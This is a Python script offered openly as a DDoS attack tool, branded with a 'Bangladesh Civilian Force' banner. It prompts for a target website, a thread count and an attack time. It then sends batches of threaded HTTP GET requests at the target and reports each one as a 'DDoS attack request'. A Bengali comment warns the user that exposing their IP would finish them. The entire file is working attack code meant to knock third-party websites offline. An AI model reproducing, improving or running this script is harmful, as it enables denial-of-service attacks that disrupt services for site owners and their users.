import requests
import threading
import time
import subprocess
from colorama import init, Fore

# ভালো কাজে ব্যাবহার কইরেন!!! আইপি এক্সপস হইলে আপনি শেষ⚠
# Install required packages
packages = ["requests", "colorama"]
subprocess.run(["pip", "install", *packages])

# Initialize colorama for colored output
init()

def establish_connection(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            print(Fore.GREEN + "Connection established with", url)
            return True
        else:
            print(Fore.RED + "Failed to establish connection with", url, "- HTTP Status Code:", response.status_code)
            return False
    except Exception as e:
        print(Fore.RED + "Error establishing connection:", e)
        return False

def send_request(session, url):
    try:
        response = session.get(url)
        if response.status_code == 200:
            print(Fore.YELLOW + "DDoS attack request sent to", url)
        else:
            print(Fore.RED + "Failed to send DDoS attack request to", url, "- HTTP Status Code:", response.status_code)
    except requests.exceptions.RequestException as e:
        print(Fore.RED + "Error occurred during DDoS attack:", e)

def start_ddos(url, num_threads=100, duration=60):
    try:
        if not establish_connection(url):
            print(Fore.RED + "Exiting program.")
            return

        print(Fore.CYAN + "Setting up threads...")
        time.sleep(5)  # Wait for 5 seconds before setting up threads

        with requests.Session() as session:
            threads = []
            for _ in range(num_threads):
                thread = threading.Thread(target=send_request, args=(session, url))
                threads.append(thread)

                if len(threads) == 5:
                    for thread in threads:
                        thread.start()
                    for thread in threads:
                        thread.join()
                    threads = []
                    time.sleep(0.75)  # Wait for 0.5 seconds before starting the next batch

            # Start any remaining threads
            for thread in threads:
                thread.start()

            # Wait for all threads to finish or timeout
            for thread in threads:
                thread.join(timeout=duration)

            print(Fore.GREEN + "DDoS attack completed.")
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\nDDoS attack interrupted.")
    except Exception as e:
        print(Fore.RED + "Error occurred:", e)

def main():
    # Display ASCII art
    ascii_art = """
   
    ░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░       ░▒▓███████▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓███████▓▒░  
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░         ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░         ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░░▒▓███████▓▒░        ░▒▓██████▓▒░   ░▒▓█▓▒░  ░▒▓████████▓▒░▒▓███████▓▒░  
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░             ░▒▓█▓▒░  ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░   ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    
                                                    𝔅𝔞𝔫𝔤𝔩𝔞𝔡𝔢𝔰𝔥 ℭ𝔦𝔳𝔦𝔩𝔦𝔞𝔫 𝔉𝔬𝔯𝔠𝔢                                                         
   
   
   
    """
    print(Fore.WHITE + ascii_art)


 # User input section
    target_website = input("Enter the target website link: ")
    total_threads = int(input("Enter the total threads (default is 100): ") or "100")
    attack_time = int(input("Enter the attack time in seconds (default is 60): ") or "60")

    print("\033[1;91m\033[5mStarting DDoS attack...\033[0m")

    # Start DDoS attack
    start_ddos(target_website, total_threads, attack_time)

if __name__ == "__main__":
    main()
